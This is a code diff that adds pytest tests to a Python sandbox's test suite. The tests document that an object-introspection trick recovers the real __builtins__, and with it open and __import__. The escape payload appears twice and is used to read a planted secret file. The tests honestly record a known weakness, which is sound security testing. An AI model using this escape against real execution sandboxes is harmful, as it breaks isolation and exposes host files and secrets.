@@ -2,6 +2,8 @@
 
 from __future__ import annotations
 
+from pathlib import Path
+
 import pytest
 
 from qwen_research.computation.sandbox import PythonExecutor
@@ -59,3 +61,58 @@ def test_exception_reported() -> None:
     executor = PythonExecutor(time_limit_seconds=10)
     with pytest.raises(SandboxError):
         executor.execute("RESULT = 1 / 0")
+
+
+# -- documented limitation (honest, not a hardened boundary) ---------------
+# The sandbox whitelists builtins, which blocks naive escapes, but Python
+# object introspection can recover the *real* ``__builtins__`` dict and thus
+# ``open``/``__import__``. These tests verify that limitation rather than
+# pretending the sandbox is secure against a determined adversary.
+
+_INTROSPECTION_ESCAPE = """
+subs = ().__class__.__bases__[0].__subclasses__()
+found = None
+for c in subs:
+    try:
+        g = c.__init__.__globals__
+    except Exception:
+        continue
+    if isinstance(g.get('__builtins__'), dict):
+        found = g['__builtins__']
+        break
+RESULT = {'has_open': 'open' in found, 'has_import': '__import__' in found} if found else None
+"""
+
+
+def test_introspection_recovers_real_builtins() -> None:
+    """Document the limitation: object introspection escapes the whitelist."""
+    executor = PythonExecutor(time_limit_seconds=10)
+    result = executor.execute(_INTROSPECTION_ESCAPE)
+    # The whitelist does NOT hold against introspection — this is expected and
+    # is exactly why run_python is gated behind hardened isolation (not yet
+    # implemented).
+    assert result == {"has_open": True, "has_import": True}
+
+
+def test_introspection_can_read_file(tmp_path: Path) -> None:
+    """Demonstrate the end-to-end consequence of the limitation (read a file)."""
+    from pathlib import Path
+
+    secret = Path(tmp_path) / "secret.txt"
+    secret.write_text("top-secret")
+    executor = PythonExecutor(time_limit_seconds=10)
+    code = (
+        "subs = ().__class__.__bases__[0].__subclasses__()\n"
+        "found = None\n"
+        "for c in subs:\n"
+        "    try:\n"
+        "        g = c.__init__.__globals__\n"
+        "    except Exception:\n"
+        "        continue\n"
+        "    if isinstance(g.get('__builtins__'), dict):\n"
+        "        found = g['__builtins__']\n"
+        "        break\n"
+        f"RESULT = found['open']({str(secret)!r}).read().strip() if found else None\n"
+    )
+    result = executor.execute(code)
+    assert result == "top-secret"
